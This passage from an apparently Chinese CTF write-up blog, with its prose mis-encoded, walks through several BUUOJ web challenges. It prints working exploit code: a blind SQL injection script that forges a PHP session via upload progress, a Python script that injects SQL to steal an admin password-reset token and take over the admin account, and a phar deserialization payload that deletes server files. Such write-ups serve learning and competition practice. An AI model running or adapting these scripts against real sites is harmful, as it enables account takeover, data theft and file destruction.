class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    !is_string(<span class="variable">$value</span>) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addslashes(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œ<code>login.php</code>é‡Œé¢å­˜åœ¨å¯¹sessionè¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœsessionå­˜åœ¨çš„è¯è¿™ä¸ªé¡µé¢å°±å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œå¹¶ä¸”<code>login.php</code>æ˜¯æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ <code>session</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/SopRomeo/article/details/108967248">https://blog.csdn.net/SopRomeo/article/details/108967248</a></p>
<blockquote>
<p>åœ¨phpsessioné‡Œå¦‚æœåœ¨php.iniä¸­è®¾ç½®session.auto_start=Onï¼Œé‚£ä¹ˆPHPæ¯æ¬¡å¤„ç†PHPæ–‡ä»¶çš„æ—¶å€™éƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œsession_start()ï¼Œä½†æ˜¯session.auto_starté»˜è®¤ä¸ºOffã€‚ä¸Sessionç›¸å…³çš„å¦ä¸€ä¸ªå«session.upload_progress.enabledï¼Œé»˜è®¤ä¸ºOnï¼Œåœ¨è¿™ä¸ªé€‰é¡¹è¢«æ‰“å¼€çš„å‰æä¸‹æˆ‘ä»¬åœ¨multipart POSTçš„æ—¶å€™ä¼ å…¥PHP_SESSION_UPLOAD_PROGRESSï¼ŒPHPä¼šæ‰§è¡Œsession_start()</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://fb2324f2-cbd8-44d9-a0f4-31ef9b64b509.node4.buuoj.cn:81/templates/login.php&#x27;</span></span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;12345678&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=file, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;123456789&#x27;</span>&#125;,</span><br><span class="line">                  cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;4459795494f0087578820b6bd1de07ff&#x27;</span>&#125;,</span><br><span class="line">                  params=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8081&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å¼€å§‹è·‘è„šæœ¬å§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://fb2324f2-cbd8-44d9-a0f4-31ef9b64b509.node4.buuoj.cn:81/templates/login.php&#x27;</span></span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;12345678&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        left = <span class="number">31</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            time.sleep(<span class="number">0.05</span>)</span><br><span class="line">            payload = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;1&quot; or ascii(substr((select secret from flag_tbl),&#123;&#125;,1))&gt;&#123;&#125;#&#x27;</span>.<span class="built_in">format</span>(i, mid),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">            r = requests.post(url,</span><br><span class="line">                              files=file,</span><br><span class="line">                              data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;123456789&#x27;</span>&#125;,</span><br><span class="line">                              cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;4459795494f0087578820b6bd1de07ff&#x27;</span>&#125;,</span><br><span class="line">                              params=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Try&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;nonono&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># database = ptbctf</span></span><br><span class="line"><span class="comment"># table flag_tbl</span></span><br></pre></td></tr></table></figure>

<h2 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker_Easy"></a>Wallbreaker_Easy</h2><ul>
<li>bypass disable_function</li>
</ul>
<p>é¢˜ç›®æè¿°</p>
<blockquote>
<p>Imagick is a awesome library for hackers to break <code>disable_functions</code>.<br>So I installed php-imagick in the server, opened a <code>backdoor</code> for you.<br>Letâ€™s try to execute <code>/readflag</code> to get the flag.<br>Open basedir: /var/www/html:/tmp/98e92802eccf20eabb854e0b716c9db8<br>Hint: eval($_POST[â€œbackdoorâ€]);</p>
</blockquote>
<h3 id="1-èšå‰‘"><a href="#1-èšå‰‘" class="headerlink" title="1.èšå‰‘"></a>1.èšå‰‘</h3><p>ç›´æ¥èšå‰‘åˆ©ç”¨æ’ä»¶ç»•è¿‡<code>disable_functions</code></p>
<p><img src="https://img-blog.csdnimg.cn/291f014d14a84d278e741035aae28fd8.png" alt="image-20220623140930254"></p>
<p><img src="https://img-blog.csdnimg.cn/98178f652d824b5ebc88d6717447563f.png" alt="image-20220623140942915"></p>
<h2 id="BSidesCF-2019-Mixer"><a href="#BSidesCF-2019-Mixer" class="headerlink" title="[BSidesCF 2019]Mixer"></a>[BSidesCF 2019]Mixer</h2><ul>
<li>å¯†ç </li>
</ul>
<p>ä¸å¤§ä¼š</p>
<p><a href="https://github.com/beerpwn/ctf/tree/master/2019/BSidesSF_CTF/web/mixer">https://github.com/beerpwn/ctf/tree/master/2019/BSidesSF_CTF/web/mixer</a></p>
<p><a href="https://blog.csdn.net/a3320315/article/details/104335989?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1">https://blog.csdn.net/a3320315/article/details/104335989?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1</a></p>
<h2 id="æŠ¤ç½‘æ¯-2018-easy-laravel"><a href="#æŠ¤ç½‘æ¯-2018-easy-laravel" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_laravel"></a>[æŠ¤ç½‘æ¯ 2018]easy_laravel</h2><ul>
<li>phpæ¡†æ¶</li>
<li>ç®€å•çš„sql</li>
</ul>
<p>å­˜åœ¨æºï¼Œå¹¶ä¸”åœ¨<code>note</code>è·¯ç”±ä¸‹å­˜åœ¨sqlæ³¨å…¥ï¼Œå¹¶ä¸”æ˜¯å‡ ä¹æ²¡æœ‰ä»»ä½•è¿‡æ»¤</p>
<h3 id="0x01-ç®€å•å®¡è®¡"><a href="#0x01-ç®€å•å®¡è®¡" class="headerlink" title="0x01:ç®€å•å®¡è®¡"></a>0x01:ç®€å•å®¡è®¡</h3><p>å…ˆçœ‹å‡ ä¸ª<code>Controller</code></p>
<p>æœ‰ç™»é™†æ³¨å†Œç­‰ï¼Œä½†æ˜¯UploadControlleréœ€è¦æ˜¯adminæ‰èƒ½è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬æˆ–è®¸å¯ä»¥adminç™»å½•ï¼Œè€Œæˆ‘ä»¬åœ¨<code>AdminMiddleware</code>ä¸­å¯ä»¥å¾—åˆ°adminçš„é‚®ç®±<code>admin@qvq.im</code></p>
<p>é‚£æ¥ä¸‹å»å°±çœ‹çœ‹è¯¥æ€ä¹ˆç™»å½•äº†</p>
<p>å­˜åœ¨<code>ResetPasswordController</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬æˆ–è®¸å¯ä»¥é€šè¿‡è¿™ä¸ªä¿®æ”¹adminçš„å¯†ç </p>
<p>ç®€å•è·Ÿè¿›ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°resetéœ€è¦è·å–token</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;validate(<span class="variable">$request</span>, <span class="keyword">$this</span>-&gt;rules(), <span class="keyword">$this</span>-&gt;validationErrorMessages());</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">$this</span>-&gt;broker()-&gt;reset(<span class="keyword">$this</span>-&gt;credentials(<span class="variable">$request</span>), <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$user</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;resetPassword(<span class="variable">$user</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$response</span> == Password::PASSWORD_RESET ? <span class="keyword">$this</span>-&gt;sendResetResponse(<span class="variable">$response</span>) : <span class="keyword">$this</span>-&gt;sendResetFailedResponse(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;token&#x27;</span> =&gt; <span class="string">&#x27;required&#x27;</span>, <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;required|email&#x27;</span>, <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;required|confirmed|min:6&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”åœ¨<code>2014_10_12_100000_create_password_resets_table.php</code>ä¸­å¯ä»¥å‘ç°æœ‰<code>password_resets</code>è¡¨ï¼Œå…¶ä¸­å°±æœ‰tokenï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾åˆ°adminå¯¹åº”çš„tokenå°±å¥½äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹å»å°±æ˜¯æƒ³è¿›è¡Œä¸€ä¸ªsqlæ³¨å…¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">up</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Schema::create(<span class="string">&#x27;password_resets&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">Blueprint <span class="variable">$table</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span>-&gt;string(<span class="string">&#x27;email&#x27;</span>)-&gt;index();</span><br><span class="line">        <span class="variable">$table</span>-&gt;string(<span class="string">&#x27;token&#x27;</span>)-&gt;index();</span><br><span class="line">        <span class="variable">$table</span>-&gt;timestamp(<span class="string">&#x27;created_at&#x27;</span>)-&gt;nullable();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>FlagController</code>ä¸­å¯ä»¥çŸ¥é“flagæ–‡ä»¶åä¸º<code>/th1s1s_F14g_2333333</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/th1s1s_F14g_2333333&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&#x27;auth.flag&#x27;</span>)-&gt;with(<span class="string">&#x27;flag&#x27;</span>, <span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>UploadController</code>åªå…è®¸adminè®¿é—®ï¼Œuploadæ–¹æ³•ä¼šå¯¹æ–‡ä»¶åç¼€è¿›è¡Œæ£€æµ‹åªèƒ½æ˜¯å›¾ç‰‡æˆ–è€…æ˜¯gif</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">UploadRequest <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;file(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$file</span> &amp;&amp; <span class="variable">$file</span>-&gt;isValid())) &#123;</span><br><span class="line">        <span class="variable">$allowed_extensions</span> = [<span class="string">&quot;bmp&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = <span class="variable">$file</span>-&gt;getClientOriginalExtension();</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, <span class="variable">$allowed_extensions</span>))&#123;</span><br><span class="line">            <span class="variable">$file</span>-&gt;move(<span class="keyword">$this</span>-&gt;path, <span class="variable">$file</span>-&gt;getClientOriginalName());</span><br><span class="line">            Flash::success(<span class="string">&#x27;ä¸Šä¼ æˆåŠŸ&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> redirect(route(<span class="string">&#x27;upload&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Flash::error(<span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> redirect(route(<span class="string">&#x27;upload&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œcheckæ–¹æ³•å…è®¸ä¼ pathå’Œfilenameï¼Œå¹¶ä¸”ä¼šå°†è¿™ä¸¤ä¸ªæ‹¼æ¥è¿›è¡Œæ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œä¸ç®¡æ€ä¹ˆæ ·éƒ½å¾ˆå®¹æ˜“æƒ³åˆ°å¯ä»¥å†™å…¥ä¸€äº›åè®®æ¥è·å–flagæˆ–è€…åˆ©ç”¨pharåè®®è§¦å‘ååºåˆ—åŒ–â€¦â€¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$request</span>-&gt;input(<span class="string">&#x27;path&#x27;</span>, <span class="keyword">$this</span>-&gt;path);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$request</span>-&gt;input(<span class="string">&#x27;filename&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filename</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$path</span> . <span class="variable">$filename</span>))&#123;</span><br><span class="line">            Flash::error(<span class="string">&#x27;ç£ç›˜æ–‡ä»¶å·²åˆ é™¤ï¼Œåˆ·æ–°æ–‡ä»¶åˆ—è¡¨&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Flash::success(<span class="string">&#x27;æ–‡ä»¶æœ‰æ•ˆ&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> redirect(route(<span class="string">&#x27;files&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>NoteController</code>ä¸­å¯ä»¥å‘ç°å­˜åœ¨å¾ˆæ˜æ˜¾çš„SQLæ³¨å…¥ï¼Œé‚£æˆ‘ä»¬ä¸€å¼€å§‹çš„ç‚¹å°±ä»è¿™é‡Œå¼€å§‹äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Note <span class="variable">$note</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$username</span> = Auth::user()-&gt;name;</span><br><span class="line">    <span class="variable">$notes</span> = DB::select(<span class="string">&quot;SELECT * FROM `notes` WHERE `author`=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;note&#x27;</span>, compact(<span class="string">&#x27;notes&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x02-SQL"><a href="#0x02-SQL" class="headerlink" title="0x02:SQL"></a>0x02:SQL</h3><p>æŸ¥è¯¢tokenå¹¶ä¿®æ”¹adminå¯†ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">Url = <span class="string">&#x27;http://02bd8596-dd4e-4b6a-8457-38ed953dea29.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCSRFToken</span>(<span class="params">url</span>):</span>  <span class="comment"># &#123;&quot;csrfToken&quot;:&quot;NHvZDMlQGmLfCmATe4gJIedESNKK7cF8kDq8ItSM&quot;&#125;</span></span><br><span class="line">    r = req.get(url)</span><br><span class="line">    zz = re.<span class="built_in">compile</span>(<span class="string">&#x27;\&#123;\&quot;csrfToken\&quot;\:\&quot;([a-zA-Z0-9]&#123;0,&#125;)\&quot;\&#125;&#x27;</span>)</span><br><span class="line">    res = zz.findall(r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;_token = &quot;</span> + res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_to_note</span>(<span class="params">payload</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;_token&#x27;</span>: getCSRFToken(Url+<span class="string">&#x27;register&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;12&#123;&#125;@qq.&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(random() * <span class="number">26</span> + <span class="number">97</span>))) + </span><br><span class="line">            <span class="built_in">chr</span>(<span class="built_in">int</span>(random() * <span class="number">26</span> + <span class="number">97</span>)) + <span class="built_in">chr</span>(<span class="built_in">int</span>(random() * <span class="number">26</span> + <span class="number">97</span>)) + <span class="built_in">chr</span>(<span class="built_in">int</span>(random() * <span class="number">26</span> + <span class="number">97</span>)),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password_confirmation&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    r = req.post(url=Url+<span class="string">&#x27;register&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[*]Register Success!!!&#x27;</span>)</span><br><span class="line">        r2 = req.get(url=Url+<span class="string">&#x27;note&#x27;</span>)</span><br><span class="line">        a = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;div class=&quot;col-xs-10&quot;&gt; ([0-9a-zA-Z]+) &lt;/div&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r2.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;col-xs-10&#x27;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            <span class="built_in">print</span>(a.findall(r2.text))</span><br><span class="line">            resetToken = a.findall(r2.text)</span><br><span class="line">            <span class="keyword">return</span> resetToken</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;Whoops&#x27;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_password</span>(<span class="params">token</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;_token&#x27;</span>: getCSRFToken(Url+<span class="string">&#x27;password/reset/&#x27;</span>+token),</span><br><span class="line">            <span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;admin@qvq.im&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password_confirmation&#x27;</span>: <span class="string">&#x27;123456&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">    r = req.post(url=Url+<span class="string">&#x27;password/reset&#x27;</span>, data=data)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[*]Reset password success!!&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    answer = <span class="string">&quot;1&#x27; union select 1,(select token from password_resets where email=&#x27;admin@qvq.im&#x27; limit 1),3,4,5-- &quot;</span></span><br><span class="line">    token = register_to_note(payload=answer)[<span class="number">0</span>]</span><br><span class="line">    reset_password(token)</span><br></pre></td></tr></table></figure>

<h3 id="0x03-Blade"><a href="#0x03-Blade" class="headerlink" title="0x03:Blade"></a>0x03:Blade</h3><p>ç™»å½•adminè´¦å·ä¹‹åï¼Œè™½ç„¶flagé¡µé¢å¯ä»¥è®¿é—®ï¼Œä½†æ˜¯å´æ²¡æœ‰ä¸œè¥¿</p>
<p>æ‰€ä»¥éœ€è¦æŠŠä¹‹å‰çš„æ¨¡æ¿æ–‡ä»¶åˆ æ‰å†å»è®¿é—®flag</p>
<p>ä¹‹å‰ä¹Ÿæåˆ°è¿‡å¯åœ¨<code>file_exists</code>åˆ©ç”¨pharåè®®è§¦å‘ååºåˆ—åŒ–ï¼Œå¹¶ä¸”è¿˜å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œè¿™å°±æ˜¯æå¥½çš„æœºä¼šäº†ï¼Œç›´æ¥å…¨å±€æœç´¢unlinkæˆ–è€…<code>__destruct</code>ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">        @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ç°åœ¨å°±æ˜¯æ‰¾åˆ°æ”¹æ¨¡æ¿æ–‡ä»¶çš„æ–‡ä»¶åäº†</p>
<p><a href="https://blog.csdn.net/weixin_43610673/article/details/107777433">https://blog.csdn.net/weixin_43610673/article/details/107777433</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_path</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filepath</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = <span class="variable">$filepath</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Swift_IoException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// /var/www/html/resources/views/auth/flag.blade.php =&gt; 73eb5933be1eb2293500f4a74b45284fd453f0bb</span></span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&#x27;/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php&#x27;</span>;</span><br><span class="line">        <span class="built_in">parent</span>::__construct(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream());</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;symlink.phar&quot;</span>); <span class="comment">//.pharæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//å›ºå®šçš„</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆpharæ–‡ä»¶ä¹‹åï¼Œè¿›è¡Œæ–‡ä»¶ä¸Šä¼ å¹¶ä¸”æŠ“åŒ…ä¿®æ”¹åç¼€åï¼Œå†åœ¨checké¡µé¢æ‰§è¡Œpharåè®®è§¦å‘ååºåˆ—åŒ–åˆ é™¤æœªåŠæ—¶åˆ é™¤çš„flagæ¨¡æ¿æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;path = storage_path(<span class="string">&#x27;app/public&#x27;</span>);</span><br></pre></td></tr></table></figure>

